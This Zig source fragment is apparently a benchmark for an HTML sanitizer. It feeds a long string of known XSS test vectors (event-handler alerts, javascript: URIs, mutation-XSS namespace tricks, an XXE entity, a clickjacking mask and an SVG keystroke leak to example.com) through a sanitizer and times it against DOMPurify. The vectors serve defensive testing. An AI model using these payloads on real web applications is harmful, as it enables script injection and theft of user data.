        \\<div id="7"><input onfocus=alert(7) autofocus>//["'`-->]]>]</div>
        \\
        \\<div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'`-->]]>]</div>
        \\
        \\<div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'`-->]]>]</div>
        \\
        \\<div id="10"><video poster=javascript:alert(10)//></video>//["'`-->]]>]</div>
        \\
        \\<div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'`-->]]>]</div>
        \\
        \\<div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div>
        \\
        \\<div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div>
        \\
        \\<div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div>
        \\
        \\<div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div>
        \\
        \\<div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["'`-->]]>]</div>
        \\
        \\<div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'`-->]]>]</div>
        \\
        \\<div id="18"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>//["'`-->]]>]</div>
        \\
        \\<div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'`-->]]>]</div>
        \\
        \\<div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'`-->]]>]</div>
        \\
        \\<div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'`-->]]>]</div>
        \\
        \\<div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div>
        \\
        \\<div id="23"><form id=foobar onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'`-->]]>]</div>
        \\
        \\<div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src="x"onerror=alert(24)>`>//["'`-->]]>]</div>
        \\
        \\<div id="25"><script src="#">{alert(25)}</script>;1//["'`-->]]>]</div>
        \\
        \\<div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div>
        \\
        \\<div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div><div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src="."onerror=alert(28)>>//["'`-->]]>]</div>
        \\
        \\<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'`-->]]>]</div>
        \\
        \\<div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'`-->]]>]</div>
        \\
        \\<div id="31"><frameset onload=alert(31)>//["'`-->]]>]</div>
        \\
        \\<div id="32"><table background="javascript:alert(32)"></table>//["'`-->]]>]</div>
        \\
        \\<div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'`-->]]>]</div>
        \\
        \\<div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div>
        \\
        \\<div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div>
        \\
        \\<div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'`-->]]>]</div>
        \\
        \\<div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'`-->]]>]</div>
        \\
        \\<div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["'`-->]]>]</div><div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
        \\
        \\<![><img src="]><img src=x onerror=alert(39)//">
        \\
        \\<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
        \\<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
        \\
        \\<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
        \\
        \\<div id="41"><li style=list-style:url() onerror=alert(41)></li>
        \\
        \\<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>
        \\
        \\<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div>
        \\
        \\<div id="43"><?xml version="1.0" standalone="no"?>
        \\
        \\<html xmlns="http://www.w3.org/1999/xhtml">
        \\<head>
        \\<style type="text/css">
        \\@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
        \\</style>
        \\</head>
        \\<body>Hello</body>
        \\</html>//["'`-->]]>]</div>
        \\
        \\<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div>
        \\
        \\<div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div>
        \\
        \\<div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div>
        \\
        \\<div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div>
        \\
        \\<div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div>
        \\
        \\<div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div>
        \\
        \\<div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div>
        \\
        \\<div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div>
        \\
        \\<div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div><div id="53"><xml id="xss" src="test.htc"></xml>
        \\
        \\<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
        \\
        \\<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div>
        \\
        \\<div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div>
        \\
        \\<div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div>
        \\
        \\<div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div>
        \\
        \\<div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div>
        \\
        \\<div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div>
        \\
        \\<div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
        \\
        \\<div id="62"><!-- IE 6-8 -->
        \\<x '="foo"><x foo='><img src=x onerror=alert(62)//'>
        \\<!-- IE 6-9 -->
        \\<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
        \\<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>
        \\
        \\<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
        \\<img src="javascript:alert(2)">
        \\<image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓
        \\<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
        \\
        \\<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div>
        \\
        \\<div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div><div id="66"><?xml version="1.0"?>
        \\
        \\<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
        \\<root/>//["'`-->]]>]</div>
        \\<div id="67"><!DOCTYPE x [
        \\    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"
        \\ onerror CDATA "alert(67)"
        \\ onload CDATA "alert(2)">
        \\]><img />//["'`-->]]>]</div>
        \\
        \\<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">
        \\    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>
        \\</doc>//["'`-->]]>]</div>
        \\
        \\<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div>
        \\
        \\<div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div>
        \\
        \\<div id="71"><// style=x:expression8alert(71)9>//["'`-->]]>]</div>
        \\
        \\<div id="72"><form><button formaction="javascript:alert(72)">X</button>//["'`-->]]>]</div>
        \\
        \\<div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div>
        \\
        \\<div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["'`-->]]>]</div>
        \\
        \\<div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div>
        \\
        \\<div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'`-->]]>]</div>
        \\
        \\<div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div>
        \\
        \\<div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div>
        \\
        \\<div id="79"><object allowscriptaccess="always" data="x"></object>//["'`-->]]>]</div>
        \\
        \\<div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div>
        \\
        \\<div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div>
        \\
        \\<div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div><div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
        \\
        \\<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div>
        \\
        \\<div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div>
        \\
        \\<div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div><div id="87"><svg xmlns="http://www.w3.org/2000/svg">
        \\<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
        \\<set attributeName="onmouseover" to="alert(89)"/>
        \\<animate attributeName="onunload" to="alert(89)"/>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="90"><!-- Up to Opera 10.63 -->
        \\<div style=content:url(test2.svg)></div>
        \\
        \\<!-- Up to Opera 11.64 - see link below -->
        \\
        \\<!-- Up to Opera 12.x -->
        \\<div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
        \\
        \\<div id="91">[A]
        \\<? foo="><script>alert(91)</script>">
        \\<! foo="><script>alert(91)</script>">
        \\</ foo="><script>alert(91)</script>">
        \\[B]
        \\<? foo="><x foo='?><script>alert(91)</script>'>">
        \\[C]
        \\<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
        \\[D]
        \\<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
        \\
        \\<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
        \\
        \\<div id="93"><div style="list-style:url(http://foo.f)url(javascript:alert(93));">X</div>//["'`-->]]>]</div>
        \\
        \\<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
        \\<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        \\<feImage>
        \\<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,
        \\PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
        \\</feImage>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
        \\<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>
        \\
        \\<div id="97"><!-- IE 5-9 -->
        \\<div id=d><x xmlns="><iframe onload=alert(97)"></div>
        \\<script>d.innerHTML+='';</script>
        \\<!-- IE 10 in IE5-9 Standards mode -->
        \\<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
        \\<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
        \\
        \\<div id="98"><div id=d><div style="font-family:'sansFAAFB colorAredB'">X</div></div>
        \\<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
        \\
        \\<div id="99">XXX<style>
        \\
        \\*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
        \\
        \\<!--
        \\--><!--*{color:red}   /* all UA */
        \\
        \\*{background:url(xx //**/
        \\ed/*)} /* IE 6-7 Standards mode */
        \\
        \\</style>//["'`-->]]>]</div>
        \\
        \\<div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div>
        \\
        \\<div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div><div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
        \\<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div>
        \\
        \\<div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div>
        \\
        \\<div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
        \\
        \\<div id="108"><!-- IE 5-8 standards mode -->
        \\<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx onerror=alert(108)></a>">
        \\<!-- IE 5-9 standards mode -->
        \\<!a foo=x=`y><img alt="`><img src=xx onerror=alert(2)//">
        \\<?a foo=x=`y><img alt="`><img src=xx onerror=alert(3)//">//["'`-->]]>]</div>
        \\
        \\<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
        \\<a id="x"><rect fill="white" width="1000" height="1000"/></a>
        \\<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
        \\<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
        \\
        \\<div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="113"><div id="x">XXX</div>
        \\<style>
        \\
        \\#x{font-family:foo[bar;color:green;}
        \\
        \\#y];color:red;{}
        \\
        \\</style>//["'`-->]]>]</div>
        \\
        \\<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div><div id="115"><!--[if]><script>alert(115)</script -->
        \\<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>
        \\
        \\<div id="116"><div id="x">x</div>
        \\<xml:namespace prefix="t">
        \\<import namespace="t" implementation="#default#time2">
        \\<t:set attributeName="innerHTML" targetElement="x" to="<imgsrc=xonerror=alert(116)>">//["'`-->]]>]</div>
        \\
        \\<div id="117"><a href="http://attacker.org">
        \\    <iframe src="http://example.org/"></iframe>
        \\</a>//["'`-->]]>]</div>
        \\
        \\<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">
        \\    <h1>Drop me</h1>
        \\</div>
        \\<iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>
        \\
        \\<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>
        \\
        \\<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
        \\
        \\<div id="120"><script>
        \\function makePopups(){
        \\    for (i=1;i<6;i++) {
        \\        window.open('popup.html','spam'+i,'width=50,height=50');
        \\    }
        \\}
        \\</script>
        \\<body>
        \\<a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
        \\
        \\<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
        \\xmlns:svg="http://www.w3.org/2000/svg">
        \\<body style="background:gray">
        \\<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
        \\<svg:svg>
        \\<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
        \\    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>
        \\    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>
        \\</svg:mask>
        \\</svg:svg>
        \\</body>
        \\</html>//["'`-->]]>]</div>
        \\
        \\<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
        \\
        \\<div id="123"><span class=foo>Some text</span>
        \\<a class=bar href="http://www.example.org">www.example.org</a>
        \\<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
        \\<script>
        \\$("span.foo").click(function() {
        \\alert('foo');
        \\$("a.bar").click();
        \\});
        \\$("a.bar").click(function() {
        \\alert('bar');
        \\location="http://html5sec.org";
        \\});
        \\</script>//["'`-->]]>]</div>
        \\
        \\<div id="124"><script src="/example.comoo.js"></script> // Safari 5.0, Chrome 9, 10
        \\<script src="\example.comoo.js"></script> // Safari 5.0//["'`-->]]>]</div>
        \\
        \\<div id="125"><?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>//["'`-->]]>]</div>
        \\
        \\<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
        \\<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>
        \\
        \\<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
        \\<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
        \\<handler id="y">alert(127)</handler>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="128"><svg><style><img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
        \\
        \\<div id="129"><svg><image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
        \\<!--
        \\Same effect with
        \\<image filter='...'>
        \\-->
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="130"><math href="javascript:alert(130)">CLICKME</math>
        \\<math>
        \\<!-- up to FF 13 -->
        \\<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>
        \\
        \\<!-- FF 14+ -->
        \\<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
        \\</math>//["'`-->]]>]</div>
        \\
        \\<div id="132"><!doctype html>
        \\<form>
        \\<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
        \\<br>
        \\<input name="secret" type="password">
        \\</form>
        \\<!-- injection --><svg height="50px">
        \\<image xmlns:xlink="http://www.w3.org/1999/xlink">
        \\<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
        \\<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
        \\<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
        \\<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
        \\</image>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="133"><!-- `<img/src=xxx onerror=alert(133)//--!>//["'`-->]]>]</div>
        \\
        \\<div id="134"><xmp>
        \\<%
        \\</xmp>
        \\<img alt='%></xmp><img src=xx onerror=alert(134)//'>
        \\
        \\<script>
        \\x='<%'
        \\</script> %>/
        \\alert(2)
        \\</script>
        \\
        \\XXX
        \\<style>
        \\*['<!--']{}
        \\</style>
        \\-->{}
        \\*{color:red}</style>//["'`-->]]>]</div>
        \\
        \\<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
        \\<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
        \\<template match="/">
        \\<eval>new ActiveXObject('htmlfile').parentWindow.alert(135)</eval>
        \\<if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
        \\</template>
        \\</stylesheet>//["'`-->]]>]</div>
        \\
        \\<div id="136"><form action="x" method="post">
        \\<input name="username" value="admin" />
        \\<input name="password" type="password" value="secret" />
        \\<input name="injected" value="injected" dirname="password" />
        \\<input type="submit">
        \\</form>//["'`-->]]>]</div>
        \\
        \\<div id="137"><svg>
        \\<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
        \\<circle r="400"></circle>
        \\<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
        \\</a>//["'`-->]]>]</div>
        \\
        \\<input name=submit>123
        \\
        \\<input name=acceptCharset>123
        \\
        \\<form><input name=hasChildNodes>
        \\
        \\<img src="small.jpg" srcset="medium.jpg 1000w, large.jpg 2000w">
        \\
        \\<div inert></div>
        \\
        \\<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>
        \\
        \\<svg></p><title><a id="</title><img src=x onerror=alert()>"></textarea></svg>
        \\
        \\<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>
        \\
        \\<svg></p><title><template><style></title><img src=x onerror=alert(1)>
        \\
        \\<math></br><textarea><mtext><template><style></textarea><img src=x onerror=alert(1)>
        \\
        \\<form><input name=namespaceURI>
        \\
        \\<svg></p><math><title><style><img src=x onerror=alert(1)></style></title>
        \\
        \\<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
        \\
        \\<svg><foreignobject><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>
        \\
        \\<math><annotation-xml encoding="text/html"><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>
        \\
        \\<xmp><svg><b><style><b title='</style><img>'>
        \\
        \\<noembed><svg><b><style><b title='</style><img>'>
        \\
        \\<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert(1)>
        \\
        \\<math><mtext><table><mglyph><style><math href=javascript:alert(1)>CLICKME</math>
        \\
        \\<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
        \\
        \\<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
        \\
        \\<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
        \\
        \\<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror='alert(1)'>"></style></h1>
        \\
        \\<!-- more soon -->
        \\
        \\a<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;s>&lt/s>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">
        \\
        \\<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">
        \\
        \\
        \\<div><math></math></div>
        \\
        \\<b is="foo">bar</b>
        \\
        \\<select><template><img src=x onerror=alert(1)></template></select>
        \\
        \\<header><h1>Movie website</h1><search><form action="./search/"><label for="movie">Find a Movie</label><input type="search" id="movie" name="q" /><button type="submit">Search</button></form></search></header>
        \\
        \\<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><mask id="a" mask-type="alpha"><rect width="100%" height="100%" fill="rgb(10% 10% 10% / 0.4)"></rect><circle cx="50" cy="50" r="35" fill="rgb(90% 90% 90% / 0.6)"></circle></mask><rect width="45" height="45" fill="red" mask="url(#a)"></rect></svg>
    ;
    // Note: <image> elements in SVG are blocked (SSRF risk), which is stricter than DOMPurify

    // const allocator = testing.allocator;
    const doc = try z.parseHTML(allocator, dirty);
    defer z.destroyDocument(doc);
    const body = z.bodyNode(doc).?;

    // Initialize CSS sanitizer for <style> tag sanitization
    var css_sanitizer = try z.CssSanitizer.init(allocator, .{});
    defer css_sanitizer.deinit();

    // Use custom mode with CSS sanitization enabled
    const custom_mode = z.SanitizerMode{
        .custom = z.SanitizerOptions{
            .skip_comments = true,
            .remove_scripts = true,
            .remove_styles = false, // ← Enable CSS sanitization instead of removal
            .sanitize_inline_styles = true,
            .strict_uri_validation = true,
            .allow_custom_elements = false,
            .allow_framework_attrs = false,
            .sanitize_dom_clobbering = true,
        },
    };

    var timer = try std.time.Timer.start();

    try z.sanitizeWithCss(allocator, body, custom_mode, &css_sanitizer);

    const elapsed_ns = timer.read();
    const elapsed_us = @as(f64, @floatFromInt(elapsed_ns)) / 1000.0;
    const elapsed_ms = elapsed_us / 1000.0;

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    std.debug.print("\n=== DOMPurify Benchmark ===\n", .{});
    std.debug.print("Input size: {} bytes\n", .{dirty.len});
    std.debug.print("Output size: {} bytes\n", .{result.len});
    std.debug.print("Sanitization time: {d:.2} µs ({d:.3} ms)\n", .{ elapsed_us, elapsed_ms });
    std.debug.print("DOMPurify reference: ~11 ms\n", .{});
    std.debug.print("Speedup: {d:.1}x faster\n", .{11.0 / elapsed_ms});
}

// fn demoNativeBridge(ctx: ?*z.qjs.JSContext) !void {
//     z.print("\n=== Native Bridge Demo: JS ↔ Zig Data Transfer ------\n\n", .{});

//     // Test 1: Process regular array
//     z.print("--- Test 1: Process Array (JS → Zig → JS) ---\n", .{});
//     const test1 =
//         \\const data = [1, 2, 3, 4, 5];
//         \\console.log("Input array:", data);
//         \\const result = Native.processArray(data);
//         \\console.log("Result from Zig:", result);
//         \\result;
//     ;
//     const result1 = z.qjs.JS_Eval(
//         ctx,
//         test1,
//         test1.len,
//         "<test1>",
//         0,
//     );
//     defer z.qjs.JS_FreeValue(ctx, result1);

//     // Test 2: Transform array (return new array)
//     z.print("\n--- Test 2: Transform Array (Return New Array) ---\n", .{});
//     const test2 =
//         \\const input = [1, 2, 3, 4, 5];
//         \\console.log("Input:", input);
//         \\const output = Native.transformArray(input);
//         \\console.log("Result from Zig:", output);
//         \\output;
//     ;
//     const result2 = z.qjs.JS_Eval(
//         ctx,
//         test2,
//         test2.len,
//         "<test2>",
//         0,
//     );
//     defer z.qjs.JS_FreeValue(ctx, result2);

//     // Test 3: TypedArray (zero-copy performance)
//     z.print("\n--- Test 3: TypedArray (Zero-Copy) ---\n", .{});
//     const test3 =
//         \\const buffer = new Float64Array([10, 20, 30, 40, 50]);
//         \\console.log("TypedArray input:", buffer);
